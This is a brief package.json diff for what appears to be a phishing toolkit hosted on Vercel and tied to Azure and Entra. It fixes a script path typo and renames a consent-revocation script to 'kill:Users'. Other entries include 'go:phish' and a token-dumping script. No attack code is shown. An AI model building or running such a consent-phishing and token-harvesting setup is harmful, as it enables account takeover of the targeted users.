@@ -8,11 +8,11 @@
   },
   "scripts": {
     "dev": "vercel dev",
-    "deploy": "bash src/scripts/az-setup.sh && bash scr/scripts/entra-setup.sh && node src/scripts/sync-env.js && vercel deploy --prod",
+    "deploy": "bash src/scripts/az-setup.sh && bash src/scripts/entra-setup.sh && node src/scripts/sync-env.js && vercel deploy --prod",
     "logs": "vercel logs",
     "test": "node --test src/test/",
     "db:dump": "node src/scripts/dump-tokens.js",
-    "consent:revoke": "node src/scripts/revoke-consent.js",
+    "kill:Users": "node src/scripts/revoke-consent.js",
     "db:clear": "node src/scripts/clear-tokens.js",
     "go:phish": "bash src/scripts/phish.sh --e"
   },
